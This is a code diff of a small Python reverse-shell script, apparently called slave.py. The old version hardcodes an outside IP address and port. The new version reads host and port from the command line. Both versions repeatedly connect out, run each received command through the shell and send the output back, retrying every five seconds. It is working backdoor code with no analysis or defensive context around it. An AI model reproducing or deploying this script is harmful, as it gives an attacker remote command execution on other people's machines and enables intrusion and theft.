@@ -1,22 +1,24 @@
-import socket as s, subprocess as sp, sys, time
+import socket, subprocess, sys, time
 
-DIA_CHI_CHU = '13.221.209.96'
-CONG_KET_NOI = 7979
-
-def ket_noi_va_lang_nghe():
+def main():
+    if len(sys.argv) < 2: sys.exit("Usage: python slave.py <ip:port>")
+    host, port = sys.argv[1].split(':')
     while True:
         try:
-            sock = s.socket(s.AF_INET, s.SOCK_STREAM)
-            sock.connect((DIA_CHI_CHU, CONG_KET_NOI))
-            while True:
-                lenh = sock.recv(4096).decode('utf-8').strip()
-                if not lenh: break
-                try:
-                    ket_qua = sp.run(lenh, shell=True, capture_output=True, text=True, timeout=10)
-                    sock.sendall((ket_qua.stdout + ket_qua.stderr).encode('utf-8'))
-                except sp.TimeoutExpired:
-                    sock.sendall("Lệnh đã hết thời gian và bị hủy.\n".encode('utf-8')); continue
-                except Exception as e:
-                    sock.sendall(str(e).encode('utf-8') + b'\n')
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((host, int(port)))
+                while True:
+                    cmd = s.recv(4096).decode('utf-8').strip()
+                    if not cmd: break
+                    try:
+                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
+                        s.sendall((result.stdout + result.stderr).encode('utf-8'))
+                    except subprocess.TimeoutExpired:
+                        s.sendall(b"Lệnh đã hết thời gian.\n")
+                    except Exception as e:
+                        s.sendall(str(e).encode('utf-8') + b'\n')
         except:
             time.sleep(5)
+
+if __name__ == "__main__":
+    main()
